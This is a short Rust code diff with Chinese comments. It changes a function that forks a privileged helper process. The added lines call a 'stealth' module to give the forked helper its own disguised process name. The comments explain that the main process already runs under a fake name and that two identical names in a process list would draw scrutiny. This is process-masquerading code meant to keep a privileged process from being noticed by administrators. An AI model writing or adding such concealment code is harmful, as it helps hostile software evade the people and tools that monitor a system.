@@ -126,6 +126,13 @@ pub fn bootstrap_privileged_helper() -> Result<()> {
     }
     if pid == 0 {
         drop(parent);
+        // 这个 helper 是 fork 出来的，comm 直接从主进程继承（就是伪装名）。
+        // 再给它一个独立的名字：一个 PID 列表里两个同名进程反而值得多看一眼。
+        if let Some(name) = crate::stealth::cached_name("helper") {
+            if let Some(base) = name.rsplit('/').next() {
+                crate::stealth::set_comm(base);
+            }
+        }
         let exit_code = match helper_loop(child, commands) {
             Ok(()) => 0,
             Err(error) => {
